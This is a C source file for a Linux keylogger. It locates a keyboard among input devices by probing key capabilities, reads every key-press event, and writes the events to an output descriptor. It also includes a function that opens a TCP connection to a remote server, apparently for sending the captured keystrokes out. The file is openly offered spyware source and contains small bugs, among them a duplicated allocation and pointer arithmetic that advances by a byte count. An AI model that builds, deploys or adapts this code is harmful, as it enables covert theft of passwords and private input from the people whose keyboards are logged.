#define _XOPEN_SOURCE 700
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <netdb.h>
#include <stdint.h>
#include <linux/input.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <dirent.h>
#include <poll.h>

#include "keyLogger.h"

int STOP_KEYLOGGER = 0;

void sigHandler(int signum)
{
    STOP_KEYLOGGER = 1;
}

void startKeylogger(int keyboard, int fd_out)
{
    size_t event_size = sizeof(event);
    event *kbd_events = malloc(event_size * MAX_EVENTS);
    struct sigaction sa;

    sa.sa_flags = 0;
    sa.sa_handler = &sigHandler;

    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGPIPE, &sa, NULL);
    kbd_events = malloc(event_size * MAX_EVENTS);

    while (!STOP_KEYLOGGER)
    {
        ssize_t r = read(keyboard, kbd_events, event_size * MAX_EVENTS);
        if (r < 0)
            goto end;
        else
        {
            size_t j = 0;
            for (size_t i = 0; i < r / event_size; i++)
            {
                if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED)
                    kbd_events[j++] = kbd_events[i];
            }
            if (!writeEventsIntoFile(fd_out, kbd_events, j * event_size))
                goto end;
        }
    }
end:
    close(fd_out);
    close(keyboard);
    free(kbd_events);
    return;
}

int keyboardFound(char *path, int *keyboard_fd)
{
    DIR *dir = opendir(path);
    if (dir == NULL)
        return 0;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char filepath[320];
        snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);

        struct stat file_stat;
        if (stat(filepath, &file_stat) == -1)
        {
            perror("Error getting file information");
            continue;
        }

        if (S_ISDIR(file_stat.st_mode))
        {
            if (keyboardFound(filepath, keyboard_fd))
            {
                closedir(dir);
                return 1;
            }
        }
        else
        {
            int fd = open(filepath, O_RDONLY);
            int keys_to_check[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC};
            if (!hasRelativeMovement(fd) && !hasAbsoluteMovement(fd) && hasKeys(fd) && hasSpecificKeys(fd, keys_to_check, 12))
            {
                closedir(dir);
                *keyboard_fd = fd;
                return 1;
            }
            close(fd);
        }
    }
    closedir(dir);
    return 0;
}

int hasEventTypes(int fd, unsigned long evbit_to_check)
{
    unsigned long evbit = 0;

    ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);

    return ((evbit & evbit_to_check) == evbit_to_check);
}

int hasKeys(int fd)
{
    return hasEventTypes(fd, (1 << EV_KEY));
}

int hasRelativeMovement(int fd)
{
    return hasEventTypes(fd, (1 << EV_REL));
}

int hasAbsoluteMovement(int fd)
{
    return hasEventTypes(fd, (1 << EV_ABS));
}

int hasSpecificKeys(int fd, int *keys, size_t num_keys)
{
    size_t nchar = KEY_MAX / 8 + 1;
    unsigned char bits[nchar];

    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);

    for (size_t i = 0; i < num_keys; ++i)
    {
        int key = keys[i];
        if (!(bits[key / 8] & (1 << (key % 8))))
            return 0;
    }
    return 1;
}

int openConnectionWithServer(char *ip, short port)
{
    int sock_fd;
    struct hostent *host_info;
    struct sockaddr_in server;

    if ((host_info = gethostbyname(ip)) == NULL)
        return 0;

    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_fd < 0)
        return 0;

    memset(&server, 0, sizeof(server));

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = *((unsigned long *)host_info->h_addr_list[0]);
    server.sin_port = htons(port);
    if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0)
        return 0;

    return sock_fd;
}

int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
{
    ssize_t written;
    do
    {
        written = write(fd, events, to_write);
        if (written < 0)
            return 0;
        events += written;
        to_write -= written;
    } while (to_write > 0);
    return 1;
}
